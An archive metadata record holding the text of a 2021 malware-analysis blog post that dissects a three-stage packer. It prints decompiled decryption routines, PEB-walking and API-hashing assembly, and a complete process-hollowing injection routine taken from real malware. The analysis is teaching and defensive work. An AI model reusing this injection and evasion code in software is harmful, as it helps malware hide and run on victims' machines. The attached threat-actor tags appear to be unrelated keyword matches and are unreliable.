{
    "id": "cbd0ad16-0b6b-4b79-9408-886a8d8c7d60",
    "created_at": "2023-01-12T15:01:23.808389Z",
    "updated_at": "2025-03-27T02:09:29.361113Z",
    "deleted_at": null,
    "sha1_hash": "f3925602087f1a810c2ab9fba13ca8630f4e65ef",
    "title": "2021-04-24 - Anatomy of a simple and popular packer",
    "authors": "",
    "file_creation_date": "2022-05-28T01:21:28Z",
    "file_modification_date": "2022-05-28T01:21:28Z",
    "file_size": 1024552,
    "plain_text": "# Anatomy of a simple and popular packer\n\n**[fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/](https://fumik0.com/2021/04/24/anatomy-of-a-simple-and-popular-packer/)**\n\nfumko April 24, 2021\n\n#### Itâ€™s been a while that I havenâ€™t release some stuff here and indeed, itâ€™s mostly caused by how fucked up 2020 was. I would have been pleased if this global pandemic hasnâ€™t wrecked me so much but i was served as well. Nowadays, with everything closed, corona haircut is new trend and finding a graphic cards or PS5 is like winning at the lottery. So why not fflush all that bullshit by spending some time into malware curiosities (with the support of some croissant and animes), whatever the time, weebs are still weebs.\n\n So letâ€™s start 2021 with something really simpleâ€¦ Why not dissecting completely to the ground a well-known packer mixing C/C++ & shellcode (active since some years now).\n\n Typical icons that could be seen with this packer\n\n This one is a cool playground for checking its basics with someone that need to start learning into malware analysis/reverse engineering:\n\n Obfuscation Cryptography Decompression Multi-stage\n\n\n-----\n\n#### Shellcode Remote Thread Hijacking\n\n Disclamer: This post will be different from what iâ€™m doing usually in my blog with almost no text but i took the time for decompiling and reviewing all the code. So I considered everything is explain.\n\n For this analysis, this sample will be used:\n```\nB7D90C9D14D124A163F5B3476160E1CF\n\n## Architecture\n\n#### Speaking of itself, the packer is split into 3 main stages:\n\n A PE that will allocate, decrypt and execute the shellcode nÂ°1 Saving required WinAPI calls, decrypting, decompressing and executing shellcode nÂ°2 Saving required WinAPI calls (again) and executing payload with a remote threat hijacking trick\n\n An overview of this packer\n\n## Stage 1 â€“ The PE\n\n```\n\n-----\n\n#### The first stage is misleading the analyst to think that a decent amount of instructions are performed, butâ€¦ after purging all the junk code and unused functions, the cleaned Winmain function is unveiling a short and standard setup for launching a shellcode.\n```\nint __stdcall wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR\nlpCmdLine, int nShowCmd)\n{\n int i; \n SIZE_T uBytes; \n HMODULE hModule; \n // Will be used for Virtual Protect call\n hKernel32 = LoadLibraryA(\"kernel32.dll\");\n // Bullshit stuff for getting correct uBytes value\n uBytes = CONST_VALUE\n _LocalAlloc();\n for ( i = 0; j < uBytes; ++i ) {\n  (_FillAlloc)();\n }\n _VirtualProtect();\n // Decrypt function vary between date & samples\n _Decrypt();   \n _ExecShellcode();\n return 0;\n}\n\n Itâ€™s important to notice this packer is changing its first stage regularly, but it doesnâ€™t mean the whole will change in the same way. In fact, the core remains intact but the form will be different, so whenever you have reversed this piece of code once, the pattern is recognizable easily in no time.\n\n Beside using a classic VirtualAlloc, this one is using LocalAlloc for creating an allocated memory page to store the second stage. The variable uBytes was continuously created behind some spaghetti code (global values, loops and conditions).\nint (*LocalAlloc())(void)\n{\n int (*pBuff)(void); // eax\n pBuff = LocalAlloc(0, uBytes);\n Shellcode = pBuff;\n return pBuff;\n}\n\n For avoiding giving directly the position of the shellcode, Itâ€™s using a simple addition trick for filling the buffer step by step.\n\n```\n\n-----\n\n```\nint __usercall FillAlloc(int i)\n{\n int result; // eax\n // All bullshit code removed\n result = dword_834B70 + 0x7E996;\n *(Shellcode + i) = *(dword_834B70 + 0x7E996 + i);\n return result;\n}\n\n#### Then obviously, whenever an allocation is called, VirtualProtect is not far away for finishing the job. The function name is obfuscated as first glance and adjusted. then for avoiding calling it directly, our all-time classic GetProcAddress will do the job for saving this WinAPI call into a pointer function.\nBOOL __stdcall VirtualProtect()\n{\n char v1[4]; // [esp+4h] [ebp-4h] BYREF\n String = 0;\n lstrcatA(&String, \"VertualBritect\");     // No ragrets\n byte_442581 = 'i';\n byte_442587 = 'P';\n byte_442589 = 'o';\n pVirtualProtect = GetProcAddress(hKernel32, &String);\n return (pVirtualProtect)(Shellcode, uBytes, 64, v1);\n}\n\n## Decrypting the the first shellcode\n\n#### The philosophy behind this packer will lead you to think that the decryption algorithm will not be that much complex. Here the encryption used is TEA, itâ€™s simple and easy to used\nvoid Decrypt()\n{\n SIZE_T size;\n PVOID sc; \n SIZE_T i; \n size = uBytes;\n sc = Shellcode;\n for ( i = size >> 3; i; --i )\n {\n  _TEADecrypt(sc);          \n  sc = sc + 8;         // +8 due it's v[0] & v[1] with TEA Algorithm\n }\n}\n\n I am always skeptical whenever iâ€™m reading some manual implementation of a known cryptography algorithm, due that most of the time it could be tweaked. So before trying to understand what are the changes, letâ€™s take our time to just make sure about which variable we have to identified:\n\n```\n\n-----\n\n#### v[0] and v[1] y & z Number of circles (n=32) 16 bytes key represented as k[0], k[1], k[2], k[3] delta sum\n\n Identifying TEA variables in x32dbg\n\n For adding more salt to it, you have your dose of mindless amount of garbage instructions.\n\n Junk code hiding the algorithm\n\n After removing everything unnecessary, our TEA decryption algorithm is looking like this\n\n\n-----\n\n```\nint __stdcall _TEADecrypt(int v)\n{\n unsigned int y, z, sum;\n int i, v7, v8, v9, v10, k[4]; \n int *result;\n y = *v;\n z = v[1];\n sum = 0xC6EF3720;\n k[0] = dword_440150;\n k[1] = dword_440154;\n k[3] = dword_440158;\n k[2] = dword_44015C;\n i = 32;\n do\n {\n  // Junk code purged\n  v7 = k[2] + (y >> 5);\n  v9 = (sum + y) ^ (k[3] + 16 * y);\n  v8 = v9 ^ v7;\n  z -= v8;\n  v10 = k[0] + 16 * z;\n  (_TEA_Y_Operation)((sum + z) ^ (k[1] + (z >> 5)) ^ v10);\n  sum += 0x61C88647; // exact equivalent of sum -= 0x9\n  --i;\n }\n while ( i );\n result = v;\n v[1] = z;\n *v = y;\n return result;\n}\n\n#### At this step, the first stage of this packer is now almost complete. By inspecting the dump, you can recognizing our shellcode being ready for action (55 8B EC opcodes are in my personal experience stuff that triggered me almost everytime).\n\n## Stage 2 â€“ Falling into the shellcode playground\n\n#### This shellcode is pretty simple, the main function is just calling two functions:\n\n```\n\n-----\n\n#### One focused for saving fundamentals WinAPI call\n LoadLibraryA GetProcAddress Creating the shellcode API structure and setup the workaround for pushing and launching the last shellcode stage\n\n Shellcode main()\n\n### Give my WinAPI calls\n\n#### Disclamer: In this part, almost no text explanation, everything is detailed with the code\n\n PEB & BaseDllName\n\n Like any another shellcode, it needs to get some address function to start its job, so our PEB best friend is there to do the job.\n```\n00965233 | 55            | push ebp                   |\n00965234 | 8BEC           | mov ebp,esp                  |\n00965236 | 53            | push ebx                   |\n00965237 | 56            | push esi                   |\n00965238 | 57            | push edi                   |\n00965239 | 51            | push ecx                   |\n0096523A | 64:FF35 30000000     | push dword ptr fs:[30]            |\nPointer to PEB\n00965241 | 58            | pop eax                    |\n00965242 | 8B40 0C         | mov eax,dword ptr ds:[eax+C]         |\nPointer to Ldr\n00965245 | 8B48 0C         | mov ecx,dword ptr ds:[eax+C]         |\nPointer to Ldr->InLoadOrderModuleList\n00965248 | 8B11           | mov edx,dword ptr ds:[ecx]          |\nPointer to List Entry (aka pEntry)\n0096524A | 8B41 30         | mov eax,dword ptr ds:[ecx+30]         |\nPointer to BaseDllName buffer (pEntry->DllBaseName->Buffer)\n\n Letâ€™s take a look then in the PEB structure\n\n```\n\n-----\n\n#### For beginners, i sorted all these values with there respective variable names and meaning.\n\n offset Type Variable Value\n\n 0x00 LIST_ENTRY InLoaderOrderModuleList->Flink A8 3B 8D 00\n\n 0x04 LIST_ENTRY InLoaderOrderModuleList->Blink C8 37 8D 00\n\n 0x08 LIST_ENTRY InMemoryOrderList->Flink B0 3B 8D 00\n\n 0x0C LIST_ENTRY InMemoryOrderList->Blick D0 37 8D 00\n\n\n#### 0x10 LIST_ENTRY InInitializationOrderModulerList- >Flink\n\n 0x14 LIST_ENTRY InInitializationOrderModulerList- >Blink\n\n\n#### 70 3F 8D 00\n\n BC 7B CC 77\n\n\n#### 0x18 PVOID BaseAddress 00 00 BB 77\n\n 0x1C PVOID EntryPoint 00 00 00 00\n\n 0x20 UINT SizeOfImage 00 00 19 00\n\n 0x24 UNICODE_STRING FullDllName 3A 00 3C 00 A0 35 8D 00\n\n 0x2C UNICODE_STRING BaseDllName 12 00 14 00 B0 6D BB 77\n\n Because he wants at the first the BaseDllName for getting kernel32.dll We could supposed the shellcode will use the offset 0x2c for having the value but itâ€™s pointing to 0x30\n```\n008F524A | 8B41 30         | mov eax,dword ptr ds:[ecx+30] \n\n It means, It will grab buffer pointer from the UNICODE_STRING structure\ntypedef struct _UNICODE_STRING {\n USHORT Length;\n USHORT MaximumLength;\n PWSTR Buffer;\n} UNICODE_STRING, *PUNICODE_STRING;\n\n```\n\n-----\n\n#### After that, the magic appears\n\n Register Address Symbol Value\n\n EAX 77BB6DB0 Lâ€ntdll.dllâ€\n\n Homemade checksum algorithm ?\n\n Searching a library name or function behind its respective hash is a common trick performed in the wild.\n```\n00965248 | 8B11           | mov edx,dword ptr ds:[ecx]          |\nPointer to List Entry (aka pEntry)\n0096524A | 8B41 30         | mov eax,dword ptr ds:[ecx+30]         |\nPointer to BaseDllName buffer \n0096524D | 6A 02          | push 2                    |\nIncrement is 2 due to UNICODE value\n0096524F | 8B7D 08         | mov edi,dword ptr ss:[ebp+8]         |\n00965252 | 57            | push edi                   |\nDLL Hash (searched one)\n00965253 | 50            | push eax                   |\nDLL Name\n00965254 | E8 5B000000       | call 9652B4                  |\nChecksum()\n00965259 | 85C0           | test eax,eax                 |\n0096525B | 74 04          | je 965261                   |\n0096525D | 8BCA           | mov ecx,edx                  |\npEntry = pEntry->Flink\n0096525F | EB E7          | jmp 965248                  |\n\n The checksum function used here seems to have a decent risk of hash collisions, but based on the number of occurrences and length of the strings, itâ€™s negligible. Otherwise yeah, it could be fucked up very quickly.\n\n```\n\n-----\n\n```\nBOOL Checksum(PWSTR pBuffer, int hash, int i)\n{\n int pos; // ecx\n int checksum; // ebx\n int c; // edx\n pos = 0;\n checksum = 0;\n c = 0;\n do\n {\n  LOBYTE(c) = *pBuffer | 0x60;        // Lowercase\n  checksum = 2 * (c + checksum);\n  pBuffer += i;                // +2 due it's UNICODE\n  LOBYTE(pos) = *pBuffer;\n  --pos;\n }\n while ( *pBuffer && pos );\n return checksum != hash;\n}\n\n#### Find the correct function address\n\n With the pEntry list saved and the checksum function assimilated, it only needs to perform a loop that repeat the process to get the name of the function, put him into the checksum then comparing it with the one that the packer wants.\n\n```\n\n-----\n\n```\n00965261 | 8B41 18         | mov eax,dword ptr ds:[ecx+18]         |\nBaseAddress\n00965264 | 50            | push eax                   |\n00965265 | 8B58 3C         | mov ebx,dword ptr ds:[eax+3C]         |\nPE Signature (e_lfanew) RVA\n00965268 | 03C3           | add eax,ebx                  |\npNTHeader = BaseAddress + PE Signature RVA\n0096526A | 8B58 78         | mov ebx,dword ptr ds:[eax+78]         |\nExport Table RVA\n0096526D | 58            | pop eax                    |\n0096526E | 50            | push eax                   |\n0096526F | 03D8           | add ebx,eax                  |\nExport Table\n00965271 | 8B4B 1C         | mov ecx,dword ptr ds:[ebx+1C]         |\nAddress of Functions RVA\n00965274 | 8B53 20         | mov edx,dword ptr ds:[ebx+20]         |\nAddress of Names RVA\n00965277 | 8B5B 24         | mov ebx,dword ptr ds:[ebx+24]         |\nAddress of Name Ordinals RVA\n0096527A | 03C8           | add ecx,eax                  |\nAddress Table\n0096527C | 03D0           | add edx,eax                  |\nName Pointer Table (NPT)\n0096527E | 03D8           | add ebx,eax                  |\nOrdinal Table (OT)\n00965280 | 8B32           | mov esi,dword ptr ds:[edx]          |\n00965282 | 58            | pop eax                    |\n00965283 | 50            | push eax                   |\nBaseAddress\n00965284 | 03F0           | add esi,eax                  |\nFunction Name = NPT[i] + BaseAddress\n00965286 | 6A 01          | push 1                    |\nIncrement to 1 loop\n00965288 | FF75 0C         | push dword ptr ss:[ebp+C]           |\nFunction Hash (searched one)\n0096528B | 56            | push esi                   |\nFunction Name\n0096528C | E8 23000000       | call 9652B4                  |\nChecksum()\n00965291 | 85C0           | test eax,eax                 |\n00965293 | 74 08          | je 96529D                   |\n00965295 | 83C2 04         | add edx,4                   |\n00965298 | 83C3 02         | add ebx,2                   |\n0096529B | EB E3          | jmp 965280                  |\n\n#### Save the function address\n\n When the name is matching with the hash in output, so it only requiring now to grab the function address and store into EAX.\n\n```\n\n-----\n\n```\n0096529D | 58            | pop eax                    |\n0096529E | 33D2           | xor edx,edx                  |\nPurge\n009652A0 | 66:8B13         | mov dx,word ptr ds:[ebx]           |\n009652A3 | C1E2 02         | shl edx,2                   |\nOrdinal Value\n009652A6 | 03CA           | add ecx,edx                  |\nFunction Address RVA\n009652A8 | 0301           | add eax,dword ptr ds:[ecx]          |\nFunction Address = BaseAddress + Function Address RVA\n009652AA | 59            | pop ecx                    |\n009652AB | 5F            | pop edi                    |\n009652AC | 5E            | pop esi                    |\n009652AD | 5B            | pop ebx                    |\n009652AE | 8BE5           | mov esp,ebp                  |\n009652B0 | 5D            | pop ebp                    |\n009652B1 | C2 0800         | ret 8                     |\n\n### Road to the second shellcode ! \\o/\n\n#### Saving API into a structure\n\n Now that LoadLibraryA and GetProcAddress are saved, it only needs to select the function name it wants and putting it into the routine explain above.\n\n In the end, the shellcode is completely setup\n\n```\n\n-----\n\n```\nstruct SHELLCODE\n{\n _BYTE Start;\n SCHEADER *ScHeader;\n int ScStartOffset;\n int seed;\n int (__stdcall *pLoadLibraryA)(int *);\n int (__stdcall *pGetProcAddress)(int, int *);\n PVOID GlobalAlloc;\n PVOID GetLastError;\n PVOID Sleep;\n PVOID VirtuaAlloc;\n PVOID CreateToolhelp32Snapshot;\n PVOID Module32First;\n PVOID CloseHandle;\n};\nstruct SCHEADER\n{\n _DWORD dwSize;\n _DWORD dwSeed;\n _BYTE option;\n _DWORD dwDecompressedSize;\n};\n\n#### Abusing fake loops\n\n Something that i really found cool in this packer is how the fake loop are funky. They have no sense but somehow they are working and itâ€™s somewhat amazing. The more absurd it is, the more i like and i found this really clever.\nint __cdecl ExecuteShellcode(SHELLCODE *sc)\n{\n unsigned int i; // ebx\n int hModule; // edi\n int lpme[137]; // [esp+Ch] [ebp-224h] BYREF\n lpme[0] = 0x224;\n for ( i = 0; i < 0x64; ++i )\n {\n  if ( i )\n   (sc->Sleep)(100);\n  hModule = (sc->CreateToolhelp32Snapshot)(TH32CS_SNAPMODULE, 0);\n  if ( hModule != -1 )\n   break;\n  if ( (sc->GetLastError)() != 24 )\n   break;\n }\n if ( (sc->Module32First)(hModule, lpme) )\n  JumpToShellcode(sc); // <------ This is where to look :)\n return (sc->CloseHandle)(hModule);\n}\n\n Allocation & preparing new shellcode\n\n```\n\n-----\n\n```\nvoid __cdecl JumpToShellcode(SHELLCODE SC)\n{\n int i; \n unsigned __int8 *lpvAddr; \n unsigned __int8 *StartOffset; \n StartOffset = SC->ScStartOffset;\n Decrypt(SC, StartOffset, SC->ScHeader->dwSize, SC->ScHeader->Seed);\n if ( SC->ScHeader->Option )\n {\n  lpvAddr = (SC->VirtuaAlloc)(0, *(&SC->ScHeader->dwDecompressSize), 4096, 64);\n  i = 0;\n  Decompress(StartOffset, SC->ScHeader->dwDecompressSize, lpvAddr, i);\n  StartOffset = lpvAddr;\n  SC->ScHeader->CompressSize = i;\n }\n __asm { jmp   [ebp+StartOffset] }\n\n#### Decryption & Decompression\n\n The decryption is even simpler than the one for the first stage by using a simple re- implementation of the ms_rand function, with a set seed value grabbed from the shellcode structure, that i decided to call here SCHEADER.\nint Decrypt(SHELLCODE *sc, int startOffset, unsigned int size, int s)\n{\n  int seed; // eax\n unsigned int count; // esi\n _BYTE *v6; // edx\n seed = s;\n count = 0;\n for ( API->seed = s; count < size; ++count )\n {\n  seed = ms_rand(sc);\n  *v6 ^= seed;\n }\n return seed;\n}\n\n```\n\n-----\n\n#### XOR everywhere \\o/\n\n Then when itâ€™s done, it only needs to be decompressed.\n\n\n-----\n\n#### Decrypted shellcode entering into the decompression loop\n\n### Stage 3 â€“ Launching the payload\n\n#### Reaching finally the final stage of this packer. This is the exact same pattern like the first shellcode:\n\n Find & Stored GetProcAddress & Load Library Saving all WinAPI functions required Pushing the payload\n\n The structure from this one is a bit longer\n```\nstruct SHELLCODE\n{\n PVOID (__stdcall *pLoadLibraryA)(LPCSTR);\n PVOID (__stdcall *pGetProcAddress)(HMODULE, LPSTR);\n char notused;\n PVOID ScOffset;\n PVOID LoadLibraryA;\n PVOID MessageBoxA;\n PVOID GetMessageExtraInfo;\n PVOID hKernel32;\n PVOID WinExec;\n PVOID CreateFileA;\n PVOID WriteFile;\n PVOID CloseHandle;\n PVOID CreateProcessA;\n PVOID GetThreadContext;\n PVOID VirtualAlloc;\n PVOID VirtualAllocEx;\n PVOID VirtualFree;\n PVOID ReadProcessMemory;\n PVOID WriteProcessMemory;\n PVOID SetThreadContext;\n PVOID ResumeThread;\n PVOID WaitForSingleObject;\n PVOID GetModuleFileNameA;\n PVOID GetCommandLineA;\n PVOID RegisterClassExA;\n PVOID CreateWindowA;\n PVOID PostMessageA;\n PVOID GetMessageA;\n PVOID DefWindowProcA;\n PVOID GetFileAttributesA;\n PVOID hNtdll;\n PVOID NtUnmapViewOfSection;\n PVOID NtWriteVirtualMemory;\n PVOID GetStartupInfoA;\n PVOID VirtualProtectEx;\n PVOID ExitProcess;\n};\n\n```\n\n-----\n\n#### Interestingly, the stack string trick is different from the first stage\n\n Fake loop once, fake loop forever\n\n At this rate now, you understood, that almost everything is a lie in this packer. We have another perfect example here, with a fake loop consisting of checking a non-existent file attribute where in the reality, the variable â€œjâ€ is the only one that have a sense.\n```\nvoid __cdecl _Inject(SC *sc)\n{\n LPSTRING lpFileName; // [esp+0h] [ebp-14h]\n char magic[8]; \n unsigned int j; \n int i; \n strcpy(magic, \"apfHQ\");\n j = 0;\n i = 0;\n while ( i != 111 )\n {\n  lpFileName = (sc->GetFileAttributesA)(magic);\n  if ( j > 1 && lpFileName != 0x637ADF )\n  {\n   i = 111;\n   SetupInject(sc);\n  }\n  ++j;\n }\n}\n\n Good olâ€™ remote thread hijacking\n\n```\n\n-----\n\n#### Then entering into the Inject setup function, no need much to say, the remote thread hijacking trick is used for executing the final payload.\n\n\n-----\n\n```\n ScOffset sc >ScOffset;\n pNtHeader = (ScOffset->e_lfanew + sc->ScOffset);\n lpApplicationName = (sc->VirtualAlloc)(0, 0x2800, 0x1000, 4);\n status = (sc->GetModuleFileNameA)(0, lpApplicationName, 0x2800);\n if ( pNtHeader->Signature == 0x4550 ) // \"PE\"\n {\n  (sc->GetStartupInfoA)(&lpStartupInfo);\n  lpCommandLine = (sc->GetCommandLineA)(0, 0, 0, 0x8000004, 0, 0, &lpStartupInfo,\n&lpProcessInformation);\n  status = (sc->CreateProcessA)(lpApplicationName, lpCommandLine);\n  if ( status )\n  {\n   (sc->VirtualFree)(lpApplicationName, 0, 0x8000);\n   lpContext = (sc->VirtualAlloc)(0, 4, 4096, 4);\n   lpContext->ContextFlags = &loc_10005 + 2;\n   status = (sc->GetThreadContext)(lpProcessInformation.hThread, lpContext);\n   if ( status )\n   {\n    (sc->ReadProcessMemory)(lpProcessInformation.hProcess, lpContext->Ebx + 8,\n&BaseAddress, 4, 0);\n    if ( BaseAddress == pNtHeader->OptionalHeader.ImageBase )\n     (sc->NtUnmapViewOfSection)(lpProcessInformation.hProcess, BaseAddress);\n    lpBaseAddress = (sc->VirtualAllocEx)(\n             lpProcessInformation.hProcess,\n             pNtHeader->OptionalHeader.ImageBase,\n             pNtHeader->OptionalHeader.SizeOfImage,\n             0x3000,\n             0x40);\n    (sc->NtWriteVirtualMemory)(\n     lpProcessInformation.hProcess,\n     lpBaseAddress,\n     sc->ScOffset,\n     pNtHeader->OptionalHeader.SizeOfHeaders,\n     0);\n    for ( i = 0; i < pNtHeader->FileHeader.NumberOfSections; ++i )\n    {\n     Section = (ScOffset->e_lfanew + sc->ScOffset + 40 * i + 248);\n     (sc->NtWriteVirtualMemory)(\n      lpProcessInformation.hProcess,\n      Section[1].Size + lpBaseAddress,\n      Section[2].Size + sc->ScOffset,\n      Section[2].VirtualAddress,\n      0);\n    }\n    (sc->WriteProcessMemory)(\n     lpProcessInformation.hProcess,\n     lpContext->Ebx + 8,\n     &pNtHeader->OptionalHeader.ImageBase,\n     4,\n     0);\n    lpContext->Eax = pNtHeader->OptionalHeader.AddressOfEntryPoint +\nlpBaseAddress;\n    (sc->SetThreadContext)(lpProcessInformation.hThread, lpContext);\n    (sc->ResumeThread)(lpProcessInformation.hThread);\n\n```\n\n-----\n\n```\n    (sc >CloseHandle)(lpProcessInformation.hThread);\n    (sc->CloseHandle)(lpProcessInformation.hProcess);\n    status = (sc->ExitProcess)(0);\n   }\n  }\n }\n\n## Same but different, but still the same\n\n#### As explained at the beginning, whenever you have reversed this packer, you understand that the core is pretty similar every-time. It took only few seconds, to breakpoints at specific places to reach the shellcode stage(s).\n\n Identifying core pattern (LocalAlloc, Module Handle and VirtualProtect)\n\n The funny is on the decryption used now in the first stage, itâ€™s the exact copy pasta from the shellcode side.\n\n TEA decryption replaced with rand() + xor like the first shellcode stage\n\n At the start of the second stage, there is not so much to say that the instructions are almost identical\n\n```\n\n-----\n\n#### Shellcode nÂ°1 is identical into two different campaign waves\n\n It seems that the second shellcode changed few hours ago (at the date of this paper), so letâ€™s see if other are motivated to make their own analysis of it\n\n## Conclusion\n\n#### Well well, itâ€™s cool sometimes to deal with something easy but efficient. It has indeed surprised me to see that the core is identical over the time but I insist this packer is really awesome for training and teaching someone into malware/reverse engineering.\n\n Well, now itâ€™s time to go serious for the next release ðŸ™‚\n\n Stay safe in those weird times o/\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-24 - Anatomy of a simple and popular packer.pdf"
    ],
    "report_names": [
        "2021-04-24 - Anatomy of a simple and popular packer.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "dfee8b2e-d6b9-4143-a0d9-ca39396dd3bf",
            "created_at": "2022-10-25T16:07:24.467088Z",
            "updated_at": "2025-03-27T02:02:10.241387Z",
            "deleted_at": null,
            "main_name": "Circles",
            "aliases": [],
            "source_name": "ETDA:Circles",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535683,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653700888,
    "ts_modification_date": 1653700888,
    "files": {
        "pdf": "https://archive.orkl.eu/f3925602087f1a810c2ab9fba13ca8630f4e65ef.pdf",
        "text": "https://archive.orkl.eu/f3925602087f1a810c2ab9fba13ca8630f4e65ef.txt",
        "img": "https://archive.orkl.eu/f3925602087f1a810c2ab9fba13ca8630f4e65ef.jpg"
    }
}